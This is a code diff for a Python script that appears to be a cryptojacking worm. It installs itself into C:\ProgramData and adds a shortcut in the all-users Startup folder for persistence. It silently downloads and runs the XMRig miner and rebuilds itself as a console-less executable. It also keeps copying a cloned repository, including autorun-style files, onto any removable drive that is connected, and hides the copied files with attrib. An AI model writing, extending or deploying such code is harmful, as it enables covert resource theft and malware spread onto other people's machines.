@@ -2,6 +2,9 @@ import os
 import shutil
 import subprocess
 import platform
+import requests
+import zipfile
+import tarfile
 import ctypes
 import sys
 import time
@@ -10,30 +13,19 @@ import threading
 import random
 import win32com.client  # For creating shortcuts on Windows
 
-# Dynamically determine the script directory
-script_dir = os.path.dirname(os.path.abspath(__file__))
+# Relevant paths
+binary_folder = r"C:\ProgramData\binaries"  # Path for the compiled binary
+program_data_folder = r"C:\ProgramData"  # Path for the program data folder
+startup_folder = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"  # For Windows only
+repo_folder = os.path.join(program_data_folder, "my_repository")  # Path where the repo will be downloaded
 
-# Folder where the initial files are stored (relative to the script location)
-initial_files_folder = os.path.join(script_dir, "initial_files")
+# GitHub Repository URL (using .git)
+github_repo_url = 'https://github.com/jorge4684/initial_files.git'  # Replace with your repo's .git URL
 
-# File names and folder name to be copied
-file1_name = 'AUTORUN.INF'
-file2_name = 'm3tta.pyw'
-folder_name = 'OpenFile'
-
-# Paths to the initial files (in initial_files_folder)
-file1_path = os.path.join(initial_files_folder, file1_name)
-file2_path = os.path.join(initial_files_folder, file2_name)
-folder_path = os.path.join(initial_files_folder, folder_name)
-
-# Binaries folder (where files will be copied)
-binary_folder = r"C:\ProgramData\binaries"
-
-# File names for binaries and shortcuts
+# File names
 binary_name = "m3tta.exe"
 binary_path = os.path.join(binary_folder, binary_name)
 shortcut_path = os.path.join(binary_folder, f"{binary_name}.lnk")
-startup_folder = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"  # For Windows only
 startup_shortcut_path = os.path.join(startup_folder, f"{binary_name}.lnk")
 
 # Function to check if the script is running as administrator (Windows-specific)
@@ -84,82 +76,105 @@ def is_removable_drive(drive):
     except Exception as e:
         return False
 
-def copy_and_hide_binaries_folder(drive):
+def clone_repo():
+    if not os.path.exists(repo_folder):
+        os.makedirs(repo_folder)
+
     try:
-        # Ensure binary folder exists
-        if not os.path.exists(binary_folder):
-            os.makedirs(binary_folder)
+        # Clone the repository using git
+        subprocess.run(['git', 'clone', github_repo_url, repo_folder], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print(f"Repository cloned successfully to {repo_folder}")
 
-        # Copy the binaries folder to the removable drive
-        destination_path = os.path.join(drive, 'binaries')
-        if not os.path.exists(destination_path):
-            shutil.copytree(binary_folder, destination_path)
+        # The cloned folder name will be the same as the repo name, e.g., 'initial_files'
+        # Adjust this path if necessary based on the actual folder structure
+        extracted_folder = os.path.join(repo_folder, 'initial_files')  # Adjust based on your repository structure
+        return extracted_folder
 
-            # Now, copy the specific files and folder to the removable drive's binaries folder
-            # Copy files to the destination
-            shutil.copy(file1_path, destination_path)
-            shutil.copy(file2_path, destination_path)
+    except subprocess.CalledProcessError as e:
+        print(f"Error cloning the repository: {e}")
+        return None
 
-            # If the folder exists, copy the folder
-            if os.path.exists(folder_path):
-                destination_folder_path = os.path.join(destination_path, folder_name)
-                shutil.copytree(folder_path, destination_folder_path)
+# Function to copy the contents of the cloned repository to the root of a connected drive
+def copy_repo_to_drive(drive, repo_folder):
+    try:
+        # Ensure repo folder exists
+        if not os.path.exists(repo_folder):
+            print("Repository folder not found.")
+            return
 
-            # Hide the binaries folder itself first (this is key for Windows)
-            if os.name == 'nt':  # Windows
-                os.system(f'attrib +h "{destination_path}"')  # Hide the folder itself
+        # Copy files from the repo folder to the root of the connected drive
+        for item in os.listdir(repo_folder):
+            item_path = os.path.join(repo_folder, item)
+            destination_path = os.path.join(drive, item)
 
-                # Now hide all files and subdirectories inside the folder
-                for root, dirs, files in os.walk(destination_path):
-                    for file in files:
-                        file_path = os.path.join(root, file)
-                        os.system(f'attrib +h "{file_path}"')
-                    for dir_name in dirs:
-                        dir_path = os.path.join(root, dir_name)
-                        os.system(f'attrib +h "{dir_path}"')
+            if os.path.isdir(item_path):
+                shutil.copytree(item_path, destination_path)
+            else:
+                shutil.copy(item_path, destination_path)
 
-            else:  # Linux/macOS
-                # Set folder and all its contents to be private (read, write, execute for owner only)
-                os.system(f'chmod -R 700 "{destination_path}"')  # Make folder and contents private
-    except Exception as e:
-        print(f"Error copying and hiding binaries folder: {e}")  # Log the error
-
-# Function to get removable drives
-def get_removable_drives():
-    drives = [drive.device for drive in psutil.disk_partitions() if 'removable' in drive.opts]
-    return drives
-
-def copy_files_to_removable_drives():
-    removable_drives = get_removable_drives()
-
-    for drive in removable_drives:
-        # Define the destination path for the removable drive
-        destination = os.path.join(drive, 'binaries')
-        if not os.path.exists(destination):
-            os.makedirs(destination)
-
-        # Copy the files
-        try:
-            shutil.copy(file1_path, destination)
-        except Exception as e:
-            print(f"Error copying {file1_name} to {destination}: {e}")
-
-        try:
-            shutil.copy(file2_path, destination)
-        except Exception as e:
-            print(f"Error copying {file2_name} to {destination}: {e}")
-
-        try:
-            shutil.copytree(folder_path, os.path.join(destination, folder_name))
-        except Exception as e:
-            print(f"Error copying {folder_name} to {destination}: {e}")
-
-        # Hide the folder on Windows
+        # Hide the copied files and directories on Windows
         if os.name == 'nt':
-            os.system(f'attrib +h "{destination}"')
+            for item in os.listdir(drive):
+                item_path = os.path.join(drive, item)
+                if os.path.isfile(item_path):
+                    os.system(f'attrib +h "{item_path}"')
+                elif os.path.isdir(item_path):
+                    os.system(f'attrib +h "{item_path}"')
+    except Exception as e:
+        print(f"Error copying repository files to drive {drive}: {e}")
+
+# Function to download and extract XMRig based on platform (cross-platform)
+def download_xmrig():
+    system = platform.system()
+    arch = platform.architecture()[0]
+
+    if system == 'Linux':
+        if arch == '64bit':
+            xmrig_url = 'https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz'
+        else:
+            xmrig_url = 'https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-arm.tar.gz'
+    elif system == 'Windows':
+        if arch == '64bit':
+            xmrig_url = 'https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-msvc-win64.zip'
+        else:
+            xmrig_url = 'https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-msvc-win32.zip'
+    elif system == 'Darwin':  # macOS
+        if arch == '64bit':
+            xmrig_url = 'https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-macos-x64.tar.gz'
+        else:
+            raise Exception("32-bit macOS is not supported.")
+    else:
+        raise Exception("Unsupported operating system.")
+
+    xmrig_filename = 'xmrig_downloaded'
+
+    # Download the xmrig binary
+    try:
+        response = requests.get(xmrig_url)
+        response.raise_for_status()  # Check if download was successful
+        with open(xmrig_filename, 'wb') as file:
+            file.write(response.content)
+    except requests.exceptions.RequestException as e:
+        print(f"Error downloading XMRig: {e}")  # Log the error
+        return
+
+    # Extract the binary
+    try:
+        if xmrig_url.endswith('.zip'):
+            with zipfile.ZipFile(xmrig_filename, 'r') as zip_ref:
+                zip_ref.extractall(binary_folder)
+
+            os.remove(xmrig_filename)  # Remove the downloaded file after extraction
+        elif xmrig_url.endswith('.tar.gz'):
+            with tarfile.open(xmrig_filename, 'r:gz') as tar_ref:
+                tar_ref.extractall(binary_folder)
+
+            os.remove(xmrig_filename)  # Remove the downloaded file after extraction
+    except zipfile.BadZipFile as e:
+        print(f"Error extracting XMRig: {e}")  # Log the error
 
 def generate_worker_name():
- # Generate a random number between 1 and 100
+    # Generate a random number between 1 and 100
     random_number = random.randint(1, 10000)
     return f"worker_{random_number}"
 
@@ -192,6 +207,7 @@ def start_mining():
     except Exception as e:
         print(f"Error starting mining: {e}")  # Log the error
 
+# Function to monitor mining output (cross-platform)
 def monitor_mining_output(process):
     try:
         stdout, stderr = process.communicate()
@@ -202,30 +218,44 @@ def monitor_mining_output(process):
     except Exception as e:
         print(f"Error monitoring mining output: {e}")  # Log the error
 
+# Function to monitor and copy binaries folder to removable drives (cross-platform)
+def monitor_and_copy_binaries():
+    while True:
+        try:
+            drives = [drive for drive in psutil.disk_partitions() if 'removable' in drive.opts]
+            if not drives:
+                time.sleep(10)
+            for drive in drives:
+                if is_removable_drive(drive.device):
+                    copy_repo_to_drive(drive.device, repo_folder)
+            time.sleep(10)  # Wait for 10 seconds before checking again
+        except Exception as e:
+            print(f"Error monitoring and copying binaries: {e}")  # Log the error
+            time.sleep(5)  # Retry after 5 seconds
+
+# Function to create the binary using PyInstaller
+def create_binary():
+    """Create the binary using PyInstaller."""
+    if not os.path.exists(binary_path):
+        # Suppress console output during binary creation
+        subprocess.run(
+            [
+                sys.executable,
+                "-m", "PyInstaller",
+                "--onefile",
+                "--distpath", binary_folder,
+                "--workpath", os.path.join(binary_folder, "build"),
+                "--specpath", os.path.join(binary_folder, "specs"),
+                "--noconsole",  # This option suppresses the console window
+                os.path.abspath(__file__)
+            ],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        )
+
 # Main function
 def main():
-    # Ensure the binary folder exists
-    if not os.path.exists(binary_folder):
-        os.makedirs(binary_folder)
-
-    # Copy files into the binary folder (only if they aren't already there)
-    try:
-        if not os.path.exists(os.path.join(binary_folder, file1_name)):
-            shutil.copy(file1_path, binary_folder)
-    except Exception as e:
-        print(f"Error copying {file1_name} to {binary_folder}: {e}")
-
-    try:
-        if not os.path.exists(os.path.join(binary_folder, file2_name)):
-            shutil.copy(file2_path, binary_folder)
-    except Exception as e:
-        print(f"Error copying {file2_name} to {binary_folder}: {e}")
-
-    try:
-        if not os.path.exists(os.path.join(binary_folder, folder_name)):
-            shutil.copytree(folder_path, os.path.join(binary_folder, folder_name))
-    except Exception as e:
-        print(f"Error copying {folder_name} to {binary_folder}: {e}")
+    # Create the binary if it doesn't exist
+    create_binary()
 
     # Create a shortcut to the binary
     create_shortcut(binary_path, shortcut_path)
@@ -233,11 +263,21 @@ def main():
     # Copy the shortcut to the startup folder with elevated privileges
     copy_shortcut_to_startup()
 
-    # Start mining (optional)
+    # Start mining
     start_mining()
 
-    # Monitor and copy files to removable drives in a separate thread
-    threading.Thread(target=copy_files_to_removable_drives, daemon=True).start()
+    # Download XMRig
+    download_xmrig()
+
+    repo_folder_path = clone_repo()
+
+    if repo_folder_path:
+        print(f"Repository successfully cloned to {repo_folder_path}")
+        # You can now process the repo or copy its contents as needed
+        # Example: copy_repo_to_drive(drive.device, repo_folder_path)
+
+    # Start monitoring system resources in a separate thread
+    threading.Thread(target=monitor_and_copy_binaries, daemon=True).start()
 
     # Keep the script running silently
     while True:
@@ -245,6 +285,17 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
+
+
+
+
+
+
+
+
+
 
 
 
